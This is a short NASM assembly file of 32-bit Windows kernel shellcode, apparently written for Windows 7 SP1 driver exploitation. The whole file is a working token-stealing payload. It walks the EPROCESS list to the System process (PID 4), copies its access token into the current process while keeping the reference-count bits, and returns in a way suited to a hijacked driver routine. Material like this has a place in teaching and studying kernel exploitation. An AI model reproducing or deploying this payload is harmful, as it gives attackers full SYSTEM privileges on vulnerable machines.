; compie with nasm:
; nasm.exe shellc.asm

[bits 32]

start:
pushad
mov eax, [fs:0x124]
mov eax, [eax + 0x050] ; _KTHREAD.ApcState.Process
mov ecx, eax ; we got the EPROCESS of the current process

mov edx, 0x4 ; WIN 7 SP1 SYSTEM process PID = 0x4
search_system_process:
    mov eax, [eax + 0x0b8] ; _EPROCESS.ActiveProcessLinks
    sub eax, 0x0b8 ; got to the beginning of the next EPROCESS
    cmp [eax + 0x0b4], edx ; _EPROCESS.UniqueProcessId == 4 (PID of System) ?
    jnz search_system_process

mov edx, [eax + 0xf8] ; copy _EPROCESS.Token of System to edx
mov edi, [ecx + 0xf8] ; current process token
and edx, 0xFFFFFFF8 ; apply the mask on SYSTEM process token, to remove the referece counter
and edi, 0x7 ; apply the mask on the current process token to preserve the referece counter (0y111)
add edx, edi
mov [ecx + 0x0f8], edx ; modify the token of the current process

popad
xor eax, eax                         ; Set NTSTATUS SUCCEESS
pop ebp                              ; Restore saved EBP
ret 8                                ; Return cleanly